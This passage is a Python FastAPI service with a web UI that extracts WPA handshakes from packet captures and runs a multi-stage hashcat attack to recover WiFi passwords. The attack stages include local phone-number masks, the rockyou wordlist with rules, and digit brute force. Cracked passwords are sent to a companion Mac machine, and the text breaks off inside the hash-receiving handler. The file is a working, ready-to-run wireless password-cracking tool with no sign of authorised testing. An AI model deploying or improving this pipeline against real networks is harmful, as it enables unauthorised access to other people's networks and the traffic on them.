#!/usr/bin/env python3
"""
Windows WiFi Cracker (port 8766) - hashcat control + receive from Mac.
Reference workflow: hcxpcapngtool -> hashcat (like hcxdumptool ecosystem)
"""
import os, sys, json, subprocess, threading, time, re, uuid
from pathlib import Path
from datetime import datetime
from fastapi import FastAPI, UploadFile, File, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

app = FastAPI(title="Windows WiFi Cracker")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

HASHCAT = r"C:\tools\hashcat-7.1.2\hashcat.exe"
HASHCAT_DIR = r"C:\tools\hashcat-7.1.2"
RULES = {
    "best66": os.path.join(r"C:\tools\hashcat-7.1.2\rules", "best66.rule"),
    "dive": os.path.join(r"C:\tools\hashcat-7.1.2\rules", "dive.rule"),
}
WORDLISTS = {
    "rockyou": r"C:\wifi-crack\wordlists\rockyou.txt",
    "wifi_wordlist": r"C:\wifi-crack\wordlists\wifi_wordlist_combined.txt",
}
POTFILE = r"C:\Users\crazydb911\Documents\deepseek\hashes\test_pot"
UPLOAD_DIR = r"C:\Users\crazydb911\Documents\deepseek\uploads"
LOG_DIR = r"C:\Users\crazydb911\Documents\deepseek\logs"
# 待破解佇列的落地檔：Windows 重開後清單不會消失
QUEUE_FILE = os.path.join(LOG_DIR, "hash_queue.json")
os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)

# Thermal management
TEMP_LIMIT = 85       # normal throttle
TEMP_CRIT = 92        # critical abort
TEMP_COOLDOWN = 10    # seconds to wait when throttling

# Log file (rolling by date)
LOG_FILE = os.path.join(LOG_DIR, f"cracker_{datetime.now().strftime('%Y%m%d')}.log")
LOG_LOCK = threading.Lock()

STATE = {
    "status": "idle",
    "message": "Ready",
    "progress": 0,
    "hash_file": None,
    "hash_count": 0,
    "ssid": None,
    "results": [],
    "log": [],
    "gpu_temp": None,
    "gpu_util": None,
    "speed": None,
    "cracking": False,
    "attack_info": None,
    # 待破解清單（取代舊的單槽 STATE["pending"]）
    "queue": [],
    "pending": None,
}

# ---------------- 待破解佇列 ----------------
# 舊設計：收到的 hash 只放 STATE["pending"] 單槽，新 hash 覆蓋舊 hash，而且
# receive-hash 路徑從不設定 STATE["hash_file"] → 網頁破解鈕永遠 disabled、
# /api/crack 空轉、前 19 顆的檔案留在 UPLOAD_DIR 沒有人解。
# 現在改成清單：每顆收到的 hash 都有一筆、檔名帶 uuid 不會同秒互相覆蓋、
# 清單本身也落地，Windows 重開不會遺失已收到的 hash。
def _count_lines(path):
    try:
        with open(path, encoding='utf-8', errors='ignore') as f:
            return sum(1 for l in f if l.strip())
    except Exception:
        return 0


def queue_save():
    """Persist the queue so a Windows restart does not orphan received hashes."""
    try:
        tmp = QUEUE_FILE + '.tmp'
        with open(tmp, 'w', encoding='utf-8') as f:
            json.dump(STATE["queue"], f, ensure_ascii=False)
        os.replace(tmp, QUEUE_FILE)
    except Exception:
        pass


def queue_load():
    """Restore the queue after restart; 'running' entries become 'pending'."""
    try:
        with open(QUEUE_FILE, encoding='utf-8') as f:
            d = json.load(f)
        if isinstance(d, list):
            STATE["queue"] = [e for e in d if isinstance(e, dict)
                              and e.get("hash_file")
                              and os.path.exists(e["hash_file"])]
    except Exception:
        pass
    for e in STATE["queue"]:
        if e.get("state") == "running":
            e["state"] = "pending"
    queue_save()
    sync_pending()


def queue_add(hash_file, ssid, bssid, lines, state="pending"):
    """Add one received hash. The same AP merges into one entry (no re-crack)."""
    for e in STATE["queue"]:
        same_ap = (bssid and e.get("bssid") == bssid) or \
                  (not bssid and ssid and e.get("ssid") == ssid)
        if same_ap and e.get("state") == "pending":
            try:
                with open(hash_file, encoding='utf-8', errors='ignore') as f:
                    new = [l.strip() for l in f if l.strip()]
                have = set()
                if os.path.exists(e["hash_file"]):
                    with open(e["hash_file"], encoding='utf-8',
                              errors='ignore') as g:
                        have = {l.strip() for l in g if l.strip()}
                with open(e["hash_file"], 'a', encoding='utf-8') as f:
                    for l in new:
                        if l not in have:
                            f.write(l + '\n')
                            have.add(l)
            except Exception:
                pass
            e["lines"] = _count_lines(e["hash_file"])
            e["time"] = time.strftime('%H:%M:%S')
            queue_save()
            try:
                os.remove(hash_file)
            except Exception:
                pass
            return e
    ent = {"id": uuid.uuid4().hex[:8], "hash_file": hash_file, "ssid": ssid,
           "bssid": bssid, "lines": lines, "time": time.strftime('%H:%M:%S'),
           "state": state}
    STATE["queue"].append(ent)
    queue_save()
    sync_pending()
    return ent


def queue_find(qid):
    for e in STATE["queue"]:
        if e.get("id") == qid:
            return e
    return None


def queue_take(qid=None):
    """Pick one entry (by id, else oldest pending) and mark it 'running'."""
    pick = None
    for e in STATE["queue"]:
        if qid:
            if e.get("id") == qid:
                pick = e
                break
        elif e.get("state") == "pending":
            pick = e
            break
    if pick is None:
        return None
    pick["state"] = "running"
    queue_save()
    return pick


def queue_drop(qid=None, hash_file=None):
    """Remove a finished/failed entry (the .hc22000 file stays on disk)."""
    changed = False
    for e in list(STATE["queue"]):
        if (qid and e.get("id") == qid) or \
           (hash_file and e.get("hash_file") == hash_file):
            STATE["queue"].remove(e)
            changed = True
    if changed:
        queue_save()
        sync_pending()


def sync_pending():
    """Mirror the oldest pending queue entry into STATE['pending'] (UI compat)."""
    pend = [e for e in STATE["queue"] if e.get("state") == "pending"]
    STATE["pending"] = pend[0] if pend else None


def start_crack(hash_file, ssid, qid=None, note=""):
    """Start cracking one hash file. Same hashcat as before — no new VRAM use."""
    if not hash_file or not os.path.exists(hash_file):
        log(f"crack skipped, file missing: {hash_file}")
        return False
    STATE["hash_file"] = hash_file
    STATE["ssid"] = ssid
    STATE["hash_count"] = _count_lines(hash_file)
    STATE["status"] = "cracking"
    STATE["cracking"] = True
    STATE["results"] = []
    STATE["progress"] = 5
    STATE["message"] = (f"Cracking {ssid}: {len(STAGES)}-stage ({note})..." if note
                        else f"Cracking {ssid}: {len(STAGES)}-stage...")
    if qid:
        e = queue_find(qid)
        if e is not None:
            e["state"] = "running"
            queue_save()
    threading.Thread(target=multi_stage_crack, args=(hash_file, ssid, qid),
                     daemon=True).start()
    return True


def queue_next():
    """Start the next queued hash when nothing is running and the GPU is idle."""
    if STATE.get("cracking"):
        return
    if gpu_busy():
        return
    for e in list(STATE["queue"]):
        if e.get("state") != "pending":
            continue
        if not os.path.exists(e.get("hash_file", "")):
            queue_drop(qid=e.get("id"))
            continue
        start_crack(e["hash_file"], e.get("ssid"), qid=e.get("id"),
                    note="佇列自動接續")
        return


def queue_next_later(delay=15):
    """Give the Mac a moment to poll the previous result, then continue."""
    def _go():
        time.sleep(delay)
        queue_next()
    threading.Thread(target=_go, daemon=True).start()


def log(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{ts}] {msg}"
    # In-memory (for API/UI)
    STATE["log"].append(entry)
    print(entry, flush=True)
    if len(STATE["log"]) > 800:
        STATE["log"] = STATE["log"][-800:]
    # File (for debugging/optimization)
    with LOG_LOCK:
        try:
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(entry + '\n')
        except:
            pass

def get_gpu_status():
    try:
        r = subprocess.run(
            ['nvidia-smi', '--query-gpu=temperature.gpu,utilization.gpu,memory.used',
             '--format=csv,noheader,nounits'],
            capture_output=True, text=True, timeout=5, creationflags=subprocess.CREATE_NO_WINDOW)
        t, u, m = r.stdout.strip().split(',')
        STATE["gpu_temp"] = int(t.strip())
        STATE["gpu_util"] = int(u.strip().replace('%', ''))
        STATE["gpu_mem_used"] = int(m.strip())
    except:
        pass

GPU_MEM_IDLE_MAX = 1000  # MiB; above this likely means local model occupies VRAM

def gpu_busy():
    get_gpu_status()
    return STATE.get("gpu_mem_used", 0) > GPU_MEM_IDLE_MAX

def thermal_monitor():
    """Monitor GPU temp during cracking, throttle if needed."""
    last_throttle = 0
    while STATE["cracking"]:
        get_gpu_status()
        temp = STATE.get("gpu_temp")
        if temp and temp >= TEMP_CRIT:
            if time.time() - last_throttle > TEMP_COOLDOWN:
                STATE["message"] = f"⚠️ GPU {temp}°C - CRITICAL (aborting)..."
                log(f"GPU {temp}°C >= {TEMP_CRIT}°C - CRITICAL")
                last_throttle = time.time()
        elif temp and temp >= TEMP_LIMIT:
            if time.time() - last_throttle > TEMP_COOLDOWN:
                STATE["message"] = f"🌡️ GPU {temp}°C - Throttling (waiting)..."
                log(f"GPU {temp}°C >= {TEMP_LIMIT}°C - Throttle")
                last_throttle = time.time()
                time.sleep(TEMP_COOLDOWN)
        time.sleep(3)

def get_crack_status():
    """Read hashcat progress from restore file or process output."""
    if not STATE["cracking"]:
        return
    # Try to read from the last hashcat output we captured
    try:
        # Check if hashcat is still running
        r = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq hashcat.exe'], capture_output=True, text=True, timeout=5, creationflags=subprocess.CREATE_NO_WINDOW)
        if 'hashcat.exe' not in r.stdout:
            STATE["cracking"] = False
            STATE["status"] = "idle"
            STATE["message"] = "Hashcat finished"
    except:
        pass

def extract_hashes(pcap_path, ssid, ap_mac_hint=None):
    STATE["status"] = "extracting"
    STATE["message"] = f"Extracting handshakes (SSID: {ssid})..."
    STATE["progress"] = 30
    log(f"Extracting from {pcap_path}")
    try:
        from collections import defaultdict
        from scapy.all import rdpcap, Ether, EAPOL_KEY
        pkts = rdpcap(pcap_path)
        log(f"Total packets: {len(pkts)}")
        
        rsc_groups = defaultdict(list)
        ap_mac_detected = ap_mac_hint or None
        
        for pkt in pkts:
            if not pkt.haslayer(EAPOL_KEY):
                continue
            ek = pkt[EAPOL_KEY]
            raw = bytes(ek)
            key_info = int.from_bytes(raw[1:3], 'big')
            msg_num = (key_info >> 8) & 0x03
            rsc_raw = raw[13:17]
            rsc = rsc_raw.hex()
            # Manual parse (scapy fields unreliable)
            key_mic = raw[5:13].hex()
            key_data_len = int.from_bytes(raw[21:23], 'big')
            key_data = raw[23:23+key_data_len]
            nonce = key_data[:32].hex() if key_data_len >= 32 else ''
            dst_mac = '000000000000'
            src_mac = '000000000000'
            if pkt.haslayer(Ether):
                eth = pkt[Ether]
                dst_mac = str(eth.dst).replace(':', '').lower()
                src_mac = str(eth.src).replace(':', '').lower()
                # Detect AP MAC (dst of M1 = AP)
                if msg_num == 1 and not ap_mac_detected:
                    ap_mac_detected = dst_mac
            rsc_groups[rsc].append({
                'msg_num': msg_num, 'dst_mac': dst_mac, 'src_mac': src_mac,
                'nonce': nonce, 'mic': key_mic, 'raw': raw
            })
        
        log(f"RSC groups: {len(rsc_groups)}, AP MAC: {ap_mac_detected}")
        ssid_hex = ssid.encode('utf-8').hex()
        hashes = []
        pairs = 0
        nonce_issues = 0
        for rsc, group in sorted(rsc_groups.items()):
            m1 = [f for f in group if f['msg_num'] in (1, 0)]
            m3 = [f for f in group if f['msg_num'] == 3]
            if not (m1 and m3):
                log(f"  [SKIP {rsc}] M1={len(m1)} M3={len(m3)} (need both)")
                continue
            pairs += 1
            m1f, m3f = m1[0], m3[0]
            ap_mac = m1f['dst_mac'] or ap_mac_detected or '6c4f894ca0e4'
            sta_mac = m1f['src_mac']
            anonce = m1f['nonce']
            key_mic = m3f['mic']
            ek_raw = m3f['raw']
            eapol_len = len(ek_raw)
            full_frame = bytes([1, 0x03]) + eapol_len.to_bytes(2, 'big') + ek_raw
            eapol_hex = full_frame.hex()
            hash_str = f"WPA*02*{key_mic}*{ap_mac}*{sta_mac}*{ssid_hex}*{anonce}*{eapol_hex}*03"
            hashes.append(hash_str)
            # Log details for debugging
            nonce_match = "SAME" if m1f['nonce'] == m3f['nonce'] else "DIFF"
            if nonce_match == "SAME":
                nonce_issues += 1
            # Check for truncated nonce (trailing zeros)
            nonce_trunc = "TRUNCATED" if anonce[-20:] == '0' * 20 else "OK"
            log(f"  [{pairs}] RSC={rsc} AP={ap_mac} STA={sta_mac} nonce={nonce_match}/{nonce_trunc}")
        
        log(f"M1+M3 pairs: {pairs}, nonce issues: {nonce_issues}")
        hash_file = str(Path(pcap_path).with_suffix('.hc22000'))
        with open(hash_file, 'w') as f:
            f.write('\n'.join(hashes) + '\n')
        STATE["hash_file"] = hash_file
        STATE["hash_count"] = len(hashes)
        STATE["ssid"] = ssid
        STATE["nonce_issues"] = nonce_issues
        STATE["status"] = "idle"
        STATE["message"] = f"Extracted {len(hashes)} hashes ({pairs} pairs, {nonce_issues} nonce issues)"
        STATE["progress"] = 50
        log(f"Extracted {len(hashes)} hashes -> {hash_file}")
    except Exception as e:
        STATE["status"] = "idle"
        STATE["message"] = f"Extract error: {e}"
        log(f"Extract error: {e}")

def notify_mac(password):
    """Notify Mac that Windows cracked the password."""
    import requests
    MAC_URL = "http://192.168.1.125:8765"
    try:
        log(f"Notify Mac: {password}")
        r = requests.post(
            f"{MAC_URL}/api/result",
            json={"password": password, "source": "windows_4090"},
            timeout=10)
        if r.status_code == 200:
            log(f"Mac notified: {r.status_code}")
        else:
            log(f"Mac notify failed: {r.status_code}")
    except Exception as e:
        log(f"Mac notify error: {e}")

# 只有本 app 啟動的 hashcat PID。絕不 taskkill /IM（會誤殺別輪正在跑的破解）
_OWN_HASHCAT_PID = None


def kill_own_hashcat():
    """Kill ONLY the hashcat this app started (by PID).

    舊版 taskkill /F /IM hashcat.exe：Mac 重複送同一組 hash 時，每次 receive
    都會開新 thread → 新一輪把上一輪正在跑的 hashcat 殺掉重來，前功盡棄。
    現在只殺自己記錄的 PID，不影響任何其他 hashcat，也不碰使用者的 GPU 程序。
    """
    global _OWN_HASHCAT_PID
    pid = _OWN_HASHCAT_PID
    _OWN_HASHCAT_PID = None
    if not pid:
        return
    try:
        subprocess.run(['taskkill', '/F', '/PID', str(pid)],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                       creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception:
        pass
    time.sleep(1)

def crack_hashes(hash_file, wordlist_key, rules_key=None, mode="0", mask=None,
                 keep_queue=False):
    """Run a single hashcat stage. Returns True if a password was found."""
    global _OWN_HASHCAT_PID
    STATE["status"] = "cracking"
    STATE["cracking"] = True
    STATE["progress"] = 60
    wordlist = WORDLISTS.get(wordlist_key, wordlist_key)
    rules = RULES.get(rules_key) if rules_key else None
    info = f"mode={mode}, wordlist={wordlist_key}, rules={rules_key or 'none'}"
    STATE["attack_info"] = info
    log(f"Starting hashcat ({info})")
    try:
        cmd = [HASHCAT, "-m", "22000",
               "--self-test-disable", "--restore-disable", "-O",
               f"--hwmon-temp-abort={TEMP_CRIT}", "-w", "3",
               "--potfile-path", POTFILE]
        if mode == "0":
            cmd.extend(["-a", "0", hash_file, wordlist])
            if rules:
                cmd.extend(["-r", rules])
        elif mode == "3":
            cmd.extend(["-a", "3", hash_file, wordlist, mask or "?d?d?d?d?d?d?d?d"])
        elif mode in ("1", "mask"):
            cmd.extend(["-a", "3", hash_file, mask or "?d?d?d?d?d?d?d?d"])
        log(f"CMD: {' '.join(cmd)}")
        kill_own_hashcat()
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, encoding='utf-8', errors='ignore', cwd=HASHCAT_DIR, creationflags=subprocess.CREATE_NO_WINDOW)
        _OWN_HASHCAT_PID = proc.pid
        start_time = time.time()
        last_log = 0
        speed_lines = []
        status_lines = []
        for line in proc.stdout:
            line = line.strip()
            if not line:
                continue
            now = time.time()
            if now - last_log > 15:
                last_log = now
                elapsed = int(now - start_time)
                STATE["message"] = f"Cracking... ({elapsed}s)"
                log(f"[{elapsed}s] {line[:150]}")
            # hashcat -m 22000 outputs PMKID (32 chars) + colons for WPA*02,
            # or PMK (64 chars) for WPA*01. Match both.
            if re.match(r'^[0-9a-f]{32,64}:', line):
                STATE["results"].append(line)
                log(f"CRACKED: {line}")
            if 'Speed' in line and ('MH/s' in line or 'kH/s' in line):
                speed_lines.append(line)
                STATE["speed"] = line
            if 'Status' in line:
                status_lines.append(line)
                log(f"STATUS: {line}")
            if 'Progress' in line:
                log(f"PROGRESS: {line}")
            if 'Rejected' in line:
                log(f"REJECTED: {line}")
        proc.wait()
        if _OWN_HASHCAT_PID == proc.pid:
            _OWN_HASHCAT_PID = None
        elapsed = int(time.time() - start_time)
        hc_log = os.path.join(LOG_DIR, f"hashcat_{int(start_time)}.log")
        with open(hc_log, 'w', encoding='utf-8') as f:
            f.write(f"Command: {' '.join(cmd)}\n")
            f.write(f"Start: {datetime.fromtimestamp(start_time).strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Elapsed: {elapsed}s\n")
            f.write(f"Results: {STATE['results']}\n")
            f.write(f"Speed (last): {STATE['speed']}\n")
            f.write(f"\nStatus lines:\n")
            for s in status_lines:
                f.write(s + '\n')
        log(f"Hashcat log: {hc_log}")
        results = STATE["results"]
        if not results:
            results.append("No match")
        found = len(results) > 0 and results[0] != "No match"
        STATE["cracking"] = False
        STATE["progress"] = 100
        STATE["message"] = f"Done ({elapsed}s): {len(results)} result(s)"
        log(f"Done in {elapsed}s: {results}")
        if found:
            STATE["status"] = "cracked"
            notify_mac(results[0])
            if not keep_queue:
                queue_drop(hash_file=hash_file)
            return True
        else:
            STATE["status"] = "idle"
            if not keep_queue:
                queue_drop(hash_file=hash_file)
            return False
    except Exception as e:
        STATE["status"] = "idle"
        STATE["cracking"] = False
        STATE["message"] = f"Crack error: {e}"
        log(f"Crack error: {e}")
        if not keep_queue:
            queue_drop(hash_file=hash_file)
        return False


# Multi-stage auto-escalation sequence
STAGES = [
    {"name": "手機門號 09xxxxxxxx", "wordlist": None, "rules": None, "mask": "09?d?d?d?d?d?d?d?d", "mode": "mask"},
    {"name": "wifi_wordlist straight", "wordlist": "wifi_wordlist", "rules": None, "mask": None, "mode": "0"},
    {"name": "rockyou plain", "wordlist": "rockyou", "rules": None, "mask": None, "mode": "0"},
    {"name": "8 位純數字", "wordlist": None, "rules": None, "mask": "?d?d?d?d?d?d?d?d", "mode": "mask"},
    {"name": "rockyou + best66", "wordlist": "rockyou", "rules": "best66", "mask": None, "mode": "0"},
    {"name": "10 位純數字（長攻）", "wordlist": None, "rules": None, "mask": "?d?d?d?d?d?d?d?d?d?d", "mode": "mask"},
]

def lookup_potfile(ssid_hex):
    """Look up password in potfile by SSID hex.
    Potfile format: <hash>*<SSID_HEX>:<password>
    Returns password string or None.
    """
    try:
        if not os.path.exists(POTFILE):
            return None
        want = ssid_hex.upper() if ssid_hex else None
        with open(POTFILE, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or '*' not in line:
                    continue
                # format: <hash>*<SSID_HEX>:<password>
                rest = line.split('*', 1)[1]
                if ':' in rest:
                    s_hex, password = rest.split(':', 1)
                    if s_hex.strip().upper() == want:
                        return password.strip()
    except Exception as e:
        log(f"potfile lookup error: {e}")
    return None


def multi_stage_crack(hash_file, ssid, qid=None):
    """Run bounded stages (no infinite stage). Returns immediately if potfile has answer."""
    threading.Thread(target=thermal_monitor, daemon=True).start()
    total = len(STAGES)
    try:
        for i, stage in enumerate(STAGES):
            if STATE["status"] == "cracked":
                break
            STATE["status"] = "cracking"
            STATE["cracking"] = True
            STATE["progress"] = int((i / total) * 100)
            STATE["message"] = f"[{i+1}/{total}] {stage['name']}..."
            log(f"[stage {i+1}/{total}] {stage['name']}")
            found = crack_hashes(
                hash_file,
                stage["wordlist"] or "rockyou",
                stage["rules"],
                stage["mode"],
                stage["mask"],
                keep_queue=True
            )
            if found:
                log(f"🎉 Password found at stage {i+1}: {stage['name']}")
                break
        if STATE["status"] != "cracked":
            STATE["status"] = "done"
            STATE["message"] = f"All {total} stages exhausted: no match"
            log(f"All stages done, no match for {ssid}")
    finally:
        kill_own_hashcat()
        STATE["cracking"] = False
        if qid:
            queue_drop(qid=qid)
        else:
            queue_drop(hash_file=hash_file)
        # 這一輪結束 → 還有排隊的 hash 且顯存閒置就接續跑（不新增顯存用量）
        queue_next_later()

@app.get("/")
async def root():
    return HTMLResponse("""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Windows WiFi Cracker</title>
<style>
body{font-family:-apple-system,sans-serif;max-width:1000px;margin:0 auto;padding:20px;background:#1a1a2e;color:#eee}
h1{color:#4fc3f7}
.card{background:#16213e;border-radius:8px;padding:15px;margin:10px 0}
.status{color:#4fc3f7;font-weight:bold}
.progress{width:100%;height:20px;background:#0f3460;border-radius:10px;overflow:hidden}
.progress-bar{height:100%;background:#4fc3f7;transition:width 0.3s}
.log{background:#0f3460;padding:10px;border-radius:4px;font-family:monospace;font-size:12px;max-height:300px;overflow-y:auto}
button{background:#4fc3f7;color:#1a1a2e;border:none;padding:10px 20px;border-radius:4px;cursor:pointer;font-size:16px;margin:5px}
button:hover{background:#29b6f6}
button:disabled{background:#555;cursor:not-allowed}
.gpu{display:flex;gap:20px;margin:10px 0}
.gpu-item{background:#0f3460;padding:10px;border-radius:4px;min-width:100px;text-align:center}
.gpu-value{font-size:24px;color:#4fc3f7;font-weight:bold}
select,input{background:#0f3460;color:#eee;border:none;padding:8px;border-radius:4px;margin:5px}
.results{background:#0f3460;padding:10px;border-radius:4px;font-family:monospace;white-space:pre-wrap;margin-top:10px}
</style></head><body>
<h1>Windows WiFi Cracker (RTX 4090)</h1>
<div class="card">
<div class="status">Status: <span id="status">Loading</span></div>
<div class="progress"><div class="progress-bar" id="progress" style="width:0%"></div></div>
<p id="message">Loading...</p>
<div class="gpu">
<div class="gpu-item"><div>GPU Temp</div><div class="gpu-value" id="gpu-temp">--</div><div id="temp-bar" style="height:4px;background:#4fc3f7;border-radius:2px;margin-top:4px;width:0%"></div></div>
<div class="gpu-item"><div>GPU Util</div><div class="gpu-value" id="gpu-util">--</div></div>
<div class="gpu-item"><div>Hashes</div><div class="gpu-value" id="hash-count">0</div></div>
<div class="gpu-item"><div>SSID</div><div class="gpu-value" style="font-size:14px" id="ssid">--</div></div>
</div>
<div style="margin:10px 0">
<label>Temp Limit: <input type="range" id="temp-limit" min="70" max="95" value="85" style="width:150px;vertical-align:middle"> <span id="temp-limit-val">85</span>°C</label>
<button onclick="stopCrack()" style="background:#ff5252;font-size:14px;padding:6px 14px" id="btn-stop">Stop</button>
</div>
</div>
<div class="card">
<h2>Upload & Extract</h2>
<input type="file" id="pcap-file" accept=".pcap,.pcapng,.cap">
<input type="text" id="ssid-input" placeholder="SSID" style="width:200px">
<button onclick="extract()" id="btn-extract">Extract</button>
</div>
<div class="card">
<h2>Crack</h2>
<select id="wordlist"><option value="rockyou">rockyou (490)</option><option value="wifi_wordlist">wifi_wordlist (175K)</option></select>
<select id="rules"><option value="">No rules</option><option value="best66">best66</option><option value="dive">dive</option></select>
<select id="mode"><option value="0">Straight (-a 0)</option><option value="3">Hybrid (-a 3)</option><option value="mask">Mask (-a 3)</option></select>
<input type="text" id="mask" placeholder="mask (e.g. ?d?d?d?d?d?d?d?d)" style="width:250px">
<button onclick="crack()" id="btn-crack">Crack</button>
<div style="font-size:13px;margin:6px 0">目前目標檔案: <span id="cur-file">--</span></div>
<div class="results" id="results">No results yet</div>
</div>
<div class="card">
<h2>待破解佇列 (<span id="q-count">0</span>)</h2>
<div class="results" id="q-list" style="font-size:13px"></div>
</div>
<div class="card" id="pending-card" style="display:none;border:2px solid #ff9800">
<h2>⏸ 收到新 hash — 等待確認</h2>
<div id="pending-info" style="font-size:14px;margin-bottom:8px"></div>
<button onclick="confirmCrack()" style="background:#4caf50">▶ 開始破解</button>
<button onclick="rejectCrack()" style="background:#666">✕ 拒絕</button>
</div>
<div class="card"><h2>Log (live)</h2><div class="log" id="log"></div></div>
<div class="card"><h2>File Log</h2><button onclick="loadLog()" style="font-size:12px;padding:5px 10px">Refresh</button><div class="log" id="log-file" style="max-height:200px"></div></div>
<div class="card"><h2>Uploaded PCAPs</h2><button onclick="listPcaps()" style="font-size:12px;padding:5px 10px">Refresh</button><div class="results" id="pcap-list" style="font-size:12px"></div></div>
<script>
function update(){fetch('/api/state').then(r=>r.json()).then(d=>{
document.getElementById('status').textContent=d.status;
document.getElementById('progress').style.width=d.progress+'%';
document.getElementById('message').textContent=d.message;
document.getElementById('log').innerHTML=d.log.join('<br>');
document.getElementById('log').scrollTop=document.getElementById('log').scrollHeight;
document.getElementById('gpu-temp').textContent=d.gpu_temp?d.gpu_temp+'°C':'--';
document.getElementById('gpu-util').textContent=d.gpu_util?d.gpu_util+'%':'--';
const tb=document.getElementById('temp-bar');
if(d.gpu_temp){tb.style.width=Math.min(d.gpu_temp,100)+'%';
tb.style.background=d.gpu_temp>=85?'#ff5252':d.gpu_temp>=75?'#ff9800':'#4fc3f7';}
document.getElementById('hash-count').textContent=d.hash_count||0;
document.getElementById('ssid').textContent=d.ssid||'--';
document.getElementById('results').textContent=d.results.length?d.results.join('\\n'):'No results yet';
document.getElementById('cur-file').textContent=d.hash_file||'--';
document.getElementById('btn-crack').disabled=!d.hash_file||d.status!=='idle';
const q=d.queue||[];
document.getElementById('q-count').textContent=q.length;
const ql=document.getElementById('q-list');
ql.innerHTML=q.length?q.map(function(e){return '<div>'+e.state+' | '+(e.ssid||'?')+' | '+(e.lines||0)+' 行 | '+(e.time||'')+' <button class="q-ok" data-id="'+e.id+'">開始破解</button> <button class="q-no" data-id="'+e.id+'">拒絕</button></div>';}).join(''):'（沒有待破解的 hash）';
ql.querySelectorAll('.q-ok').forEach(function(b){b.onclick=function(){confirmCrack(b.getAttribute('data-id'));};});
ql.querySelectorAll('.q-no').forEach(function(b){b.onclick=function(){rejectCrack(b.getAttribute('data-id'));};});
document.getElementById('btn-extract').disabled=d.status!=='idle';
const pc=document.getElementById('pending-card');
if(d.pending){pc.style.display='block';
const p=d.pending;
document.getElementById('pending-info').innerHTML='SSID: <b>'+p.ssid+'</b><br>BSSID: '+p.bssid+'<br>hash 行數: '+p.lines+'<br>收到時間: '+p.time+'<br>目前顯存已用: '+(d.gpu_mem_used||'?')+'MB';
}else{pc.style.display='none'}
}).catch(e=>console.error(e))}
function confirmCrack(id){fetch('/api/confirm'+(id?'?qid='+id:''),{method:'POST'}).then(r=>r.json()).then(update)}
function rejectCrack(id){fetch('/api/reject'+(id?'?qid='+id:''),{method:'POST'}).then(r=>r.json()).then(update)}
function extract(){
const f=document.getElementById('pcap-file').files[0];
const s=document.getElementById('ssid-input').value||'32H9F_5G';
if(!f){alert('Select pcap');return}
document.getElementById('btn-extract').disabled=true;
const fd=new FormData();fd.append('file',f);fd.append('ssid',s);
fetch('/api/extract',{method:'POST',body:fd}).then(r=>r.json()).then(update);
}
function crack(){
const w=document.getElementById('wordlist').value;
const r=document.getElementById('rules').value||null;
const m=document.getElementById('mode').value;
const mk=document.getElementById('mask').value||null;
const tl=document.getElementById('temp-limit').value;
document.getElementById('btn-crack').disabled=true;
fetch(`/api/crack?wordlist=${w}&rules=${r}&mode=${m}&mask=${encodeURIComponent(mk)}&temp_limit=${tl}`,{method:'POST'}).then(r=>r.json()).then(update);
}
function stopCrack(){fetch('/api/stop',{method:'POST'}).then(r=>r.json()).then(update)}
function loadLog(){fetch('/api/log').then(r=>r.json()).then(d=>{document.getElementById('log-file').textContent=d.lines.join('\\n')})}
function listPcaps(){fetch('/api/pcaps').then(r=>r.json()).then(d=>{document.getElementById('pcap-list').textContent=d.files.map(f=>f.name+' ('+(f.size/1024).toFixed(0)+'KB)').join('\\n')||'No pcaps'})}
document.getElementById('temp-limit').addEventListener('input',function(){
document.getElementById('temp-limit-val').textContent=this.value;
});
update();setInterval(update,2000);setInterval(loadLog,5000);setInterval(listPcaps,10000);
</script></body></html>""")

@app.get("/api/known")
def api_known():
    """SSID lists: cracked {ssid: password} (potfile) and captured (uploads)."""
    cracked, captured = {}, []
    try:
        if os.path.exists(POTFILE):
            with open(POTFILE, 'r') as f:
                for line in f:
                    if '*' not in line:
                        continue
                    rest = line.split('*', 1)[1]
                    if ':' in rest:
                        s_hex, pw = rest.split(':', 1)
                        try:
                            cracked[bytes.fromhex(
                                s_hex.strip().upper()).decode(
                                    'utf-8', 'replace')] = pw.strip()
                        except Exception:
                            pass
    except Exception:
        pass
    try:
        for fn in os.listdir(UPLOAD_DIR):
            if not fn.endswith('.hc22000'):
                continue
            try:
                with open(os.path.join(UPLOAD_DIR, fn), 'r') as f:
                    first = f.readline().strip()
                fields = first.split('*')
                if len(fields) > 5:
                    captured.append(bytes.fromhex(fields[5].strip().upper()).decode('utf-8', 'replace'))
            except Exception:
                pass
    except Exception:
        pass
    return JSONResponse({"ok": True, "cracked": cracked,
                         "captured": sorted(set(captured))})


@app.get("/api/state")
async def get_state():
    get_gpu_status()
    get_crack_status()
    return JSONResponse(STATE)


@app.get("/api/queue")
async def get_queue():
    """待破解清單：每個收到的 hash 一筆，不會被後到的 hash 蓋掉。"""
    return JSONResponse({"ok": True, "count": len(STATE["queue"]),
                         "queue": STATE["queue"],
                         "pending": STATE.get("pending")})

@app.post("/api/receive-hash")
async def api_receive_hash(request: Request):
    """Receive hash from Mac, start multi-stage auto-escalation cracking."""
    data = await request.json()
    hash_str = data.get("hash")
    ssid = data.get("ssid")
    bssid = data.get("bssid")
    
    if not hash_str:
        return JSONResponse({"ok": False, "error": "No hash"})
    
    log(f"Received hash from Mac: SSID={ssid}, BSSID={bssid}")
    log(f"Hash lines: {len(hash_str.splitlines())}")
    log(f"Hash: {hash_str[:80]}...")
    
    # Parse SSID_HEX from hash (WPA*02*PMKID*BSSID*CLIENT*SSID_HEX*PMK*...)
    hash_fields = hash_str.split('*')
    ssid_hex = hash_fields[5].strip() if len(hash_fields) > 5 else None
    if ssid_hex:
        ssid_hex = ssid_hex.upper()
    
    # Save hash to file. uuid in the name so two arrivals inside the same
    # second can never overwrite each other (old name was hash_<sec>.hc22000).
